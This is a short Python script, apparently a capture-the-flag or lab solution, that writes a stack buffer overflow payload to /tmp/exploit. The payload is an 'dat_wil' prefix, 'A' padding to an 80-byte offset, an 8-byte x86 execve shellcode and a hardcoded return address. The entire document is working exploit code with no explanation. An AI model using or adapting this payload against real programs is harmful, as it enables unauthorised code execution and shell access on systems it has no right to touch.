payload = b"\x99\x6a\x0b\x58\x60\x59\xcd\x80"

offset = 80
with open("/tmp/exploit","wb") as f:
    f.write(b"dat_wil\n"+b"A" * (offset-len(payload)) + payload + b"\xe0\xc8\xff\xff")